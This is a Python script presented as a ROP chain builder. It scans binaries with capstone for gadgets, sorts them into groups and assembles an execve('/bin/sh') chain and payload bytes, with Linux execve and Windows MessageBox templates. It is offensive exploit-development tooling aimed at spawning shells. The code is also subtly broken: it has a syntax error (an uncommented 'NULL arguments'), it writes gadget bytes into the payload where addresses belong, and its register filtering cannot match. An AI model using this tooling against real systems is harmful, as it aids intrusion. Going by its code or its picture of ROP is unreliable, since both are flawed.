#!/usr/bin/env python3
import struct
import re
import argparse
from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64
from capstone.x86 import X86_OP_MEM, X86_OP_REG, X86_OP_IMM

class ROPChainBuilder:
    def __init__(self, arch='x64'):
        self.arch = arch
        self.gadgets = []
        self.chain = []
        
        # Initialize disassembler
        if arch == 'x64':
            self.md = Cs(CS_ARCH_X86, CS_MODE_64)
        else:
            self.md = Cs(CS_ARCH_X86, CS_MODE_32)
        
        self.md.detail = True
        
        # Common gadget patterns
        self.useful_gadgets = {
            'stack_pivot': ['xchg', 'mov', 'add', 'sub', 'pop'],
            'register_control': ['pop', 'mov', 'xor', 'add', 'sub'],
            'memory_operations': ['mov', 'lea', 'push', 'pop'],
            'arithmetic': ['add', 'sub', 'xor', 'and', 'or'],
            'system_calls': ['syscall', 'int 0x80', 'sysenter']
        }
    
    def find_gadgets(self, binary_data, base_address=0, max_gadget_length=20):
        """Find ROP gadgets in binary data"""
        print(f"[*] Scanning for gadgets in {len(binary_data)} bytes...")
        
        gadgets_found = 0
        
        # Scan through the binary looking for ret instructions
        for i in range(len(binary_data) - 1):
            if binary_data[i] == 0xC3:  # ret instruction
                # Look backwards for potential gadgets
                for length in range(1, max_gadget_length + 1):
                    if i - length >= 0:
                        gadget_bytes = binary_data[i-length:i+1]
                        gadget_addr = base_address + i - length
                        
                        try:
                            # Disassemble the gadget
                            instructions = list(self.md.disasm(gadget_bytes, gadget_addr))
                            
                            if instructions and instructions[-1].mnemonic == 'ret':
                                gadget_info = self.analyze_gadget(instructions, gadget_bytes)
                                if gadget_info:
                                    self.gadgets.append(gadget_info)
                                    gadgets_found += 1
                        except:
                            continue
        
        print(f"[+] Found {gadgets_found} potential gadgets")
        return self.gadgets
    
    def analyze_gadget(self, instructions, raw_bytes):
        """Analyze a gadget and categorize it"""
        if not instructions:
            return None
        
        gadget = {
            'address': instructions[0].address,
            'instructions': [],
            'raw_bytes': raw_bytes,
            'length': len(raw_bytes),
            'category': 'unknown',
            'registers_read': set(),
            'registers_written': set(),
            'stack_operations': 0
        }
        
        for insn in instructions:
            gadget['instructions'].append({
                'address': insn.address,
                'mnemonic': insn.mnemonic,
                'op_str': insn.op_str,
                'bytes': insn.bytes.hex()
            })
            
            # Analyze instruction effects
            self._analyze_instruction(insn, gadget)
        
        # Categorize gadget
        gadget['category'] = self._categorize_gadget(gadget)
        
        return gadget
    
    def _analyze_instruction(self, instruction, gadget):
        """Analyze individual instruction effects"""
        if instruction.mnemonic == 'pop':
            gadget['stack_operations'] += 1
            if instruction.operands:
                gadget['registers_written'].add(instruction.operands[0].reg)
        
        elif instruction.mnemonic == 'push':
            gadget['stack_operations'] -= 1
        
        elif instruction.mnemonic in ['mov', 'add', 'sub', 'xor', 'and', 'or']:
            if instruction.operands:
                # Check for register writes
                for i, op in enumerate(instruction.operands):
                    if op.type == X86_OP_REG:
                        if i == 0:  # Destination
                            gadget['registers_written'].add(op.reg)
                        else:  # Source
                            gadget['registers_read'].add(op.reg)
    
    def _categorize_gadget(self, gadget):
        """Categorize gadget based on its functionality"""
        instructions = [i['mnemonic'] for i in gadget['instructions']]
        
        # Stack pivot gadgets
        if any(op in instructions for op in ['xchg', 'mov']):
            if 'rsp' in str(gadget['registers_written']) or 'esp' in str(gadget['registers_written']):
                return 'stack_pivot'
        
        # Register control gadgets
        if 'pop' in instructions:
            return 'register_control'
        
        # System call gadgets
        if any(op in instructions for op in ['syscall', 'int', 'sysenter']):
            return 'system_call'
        
        # Memory operations
        if any(op in instructions for op in ['mov', 'lea']):
            return 'memory_operation'
        
        return 'general'
    
    def search_gadgets(self, pattern=None, category=None, registers=None):
        """Search for gadgets matching specific criteria"""
        results = []
        
        for gadget in self.gadgets:
            match = True
            
            if pattern:
                if not any(pattern in str(gadget).lower() for pattern in pattern.lower().split()):
                    match = False
            
            if category and gadget['category'] != category:
                match = False
            
            if registers:
                reg_set = set(registers)
                if not reg_set.issubset(gadget['registers_written']):
                    match = False
            
            if match:
                results.append(gadget)
        
        return results
    
    def build_chain(self, requirements):
        """Build a ROP chain based on requirements"""
        print("[*] Building ROP chain...")
        
        chain = []
        
        # Example: Build chain to call system("/bin/sh")
        if 'execve' in requirements:
            chain.extend(self._build_execve_chain())
        
        # Example: Build chain for stack pivot
        if 'stack_pivot' in requirements:
            pivot_gadgets = self.search_gadgets(category='stack_pivot')
            if pivot_gadgets:
                chain.append(pivot_gadgets[0])
        
        self.chain = chain
        return chain
    
    def _build_execve_chain(self):
        """Build chain for execve("/bin/sh", NULL, NULL)"""
        chain = []
        
        # Find pop rdi gadget for first argument
        pop_rdi = self.search_gadgets(registers=['rdi'])
        if pop_rdi:
            chain.append({
                'gadget': pop_rdi[0],
                'value': '/bin/sh\x00',  # Will need to be in memory
                'description': 'Set RDI to /bin/sh string address'
            })
        
        # Find pop rsi, pop rdx for other arguments
        pop_rsi_rdx = self.search_gadgets(registers=['rsi', 'rdx'])
        if pop_rsi_rdx:
            chain.append({
                'gadget': pop_rsi_rdx[0],
                'values': [0, 0],  NULL arguments
                'description': 'Set RSI and RDX to NULL'
            })
        
        # Find syscall gadget
        syscall = self.search_gadgets(category='system_call')
        if syscall:
            chain.append({
                'gadget': syscall[0],
                'description': 'Execute syscall'
            })
        
        return chain
    
    def generate_payload(self, chain=None):
        """Generate final payload bytes"""
        if chain is None:
            chain = self.chain
        
        payload = b""
        
        for item in chain:
            if isinstance(item, dict) and 'gadget' in item:
                gadget = item['gadget']
                payload += gadget['raw_bytes']
                
                # Add values if specified
                if 'value' in item:
                    if self.arch == 'x64':
                        payload += struct.pack('<Q', item['value'])
                    else:
                        payload += struct.pack('<I', item['value'])
            
            elif isinstance(item, bytes):
                payload += item
        
        return payload
    
    def print_chain(self, chain=None):
        """Print human-readable ROP chain"""
        if chain is None:
            chain = self.chain
        
        print("\n" + "="*60)
        print("ROP CHAIN")
        print("="*60)
        
        for i, item in enumerate(chain):
            print(f"\n[{i}] ", end="")
            
            if isinstance(item, dict) and 'gadget' in item:
                gadget = item['gadget']
                print(f"0x{gadget['address']:016x} - {item.get('description', 'Gadget')}")
                
                for insn in gadget['instructions']:
                    print(f"     0x{insn['address']:016x}: {insn['mnemonic']} {insn['op_str']}")
                
                if 'value' in item:
                    print(f"     Value: 0x{item['value']:016x}")
            
            elif isinstance(item, str):
                print(item)

class ROPExploitTemplate:
    """Templates for common ROP exploits"""
    
    @staticmethod
    def linux_x64_execve():
        """Template for Linux x64 execve ROP chain"""
        return {
            'description': 'Linux x64 execve("/bin/sh") ROP chain',
            'requirements': ['pop_rdi', 'pop_rsi', 'pop_rdx', 'syscall'],
            'chain_steps': [
                'Write "/bin/sh" string to writable memory',
                'POP RDI -> address of "/bin/sh"',
                'POP RSI -> 0',
                'POP RDX -> 0', 
                'SYSCALL (execve)'
            ]
        }
    
    @staticmethod
    def windows_x64_messagebox():
        """Template for Windows x64 MessageBox ROP chain"""
        return {
            'description': 'Windows x64 MessageBox ROP chain',
            'requirements': ['pop_rcx', 'pop_rdx', 'pop_r8', 'pop_r9', 'call'],
            'chain_steps': [
                'POP RCX -> hWnd (0)',
                'POP RDX -> lpText (message string)',
                'POP R8 -> lpCaption (title string)',
                'POP R9 -> uType (0)',
                'CALL MessageBoxA'
            ]
        }

def main():
    parser = argparse.ArgumentParser(description='ROP Chain Builder Helper')
    parser.add_argument('binary', nargs='?', help='Binary file to analyze')
    parser.add_argument('--arch', choices=['x86', 'x64'], default='x64', help='Target architecture')
    parser.add_argument('--base-address', type=lambda x: int(x, 0), default=0x400000, help='Base address of binary')
    parser.add_argument('--search', help='Search for gadgets containing text')
    parser.add_argument('--category', choices=['stack_pivot', 'register_control', 'system_call', 'memory_operation'], help='Filter by category')
    parser.add_argument('--registers', help='Filter by registers written (comma-separated)')
    parser.add_argument('--template', choices=['linux_execve', 'windows_messagebox'], help='Use predefined template')
    
    args = parser.parse_args()
    
    builder = ROPChainBuilder(arch=args.arch)
    
    if args.binary:
        # Load and analyze binary
        try:
            with open(args.binary, 'rb') as f:
                binary_data = f.read()
            
            gadgets = builder.find_gadgets(binary_data, args.base_address)
            print(f"[+] Analyzed {len(gadgets)} gadgets")
            
        except FileNotFoundError:
            print(f"[-] File not found: {args.binary}")
            return
    
    # Search for gadgets if requested
    if args.search or args.category or args.registers:
        registers = args.registers.split(',') if args.registers else None
        results = builder.search_gadgets(pattern=args.search, category=args.category, registers=registers)
        
        print(f"\n[+] Found {len(results)} matching gadgets:")
        for gadget in results[:10]:  # Show first 10
            print(f"    0x{gadget['address']:016x}: ", end="")
            for insn in gadget['instructions']:
                print(f"{insn['mnemonic']} {insn['op_str']} ; ")
            print(f"    [Category: {gadget['category']}]")
    
    # Use template if requested
    if args.template:
        if args.template == 'linux_execve':
            template = ROPExploitTemplate.linux_x64_execve()
            print(f"\n[+] {template['description']}")
            print("    Requirements:", template['requirements'])
            print("    Steps:")
            for step in template['chain_steps']:
                print(f"      - {step}")
        
        elif args.template == 'windows_messagebox':
            template = ROPExploitTemplate.windows_x64_messagebox()
            print(f"\n[+] {template['description']}")
            print("    Requirements:", template['requirements'])
            print("    Steps:")
            for step in template['chain_steps']:
                print(f"      - {step}")
    
    # Demonstrate chain building
    if builder.gadgets:
        print("\n[*] Demonstrating chain building...")
        chain = builder.build_chain(['execve'])
        builder.print_chain(chain)
        
        payload = builder.generate_payload(chain)
        print(f"\n[+] Generated payload: {len(payload)} bytes")
        print(f"    Payload hex: {payload.hex()[:50]}...")

if __name__ == "__main__":
    main()
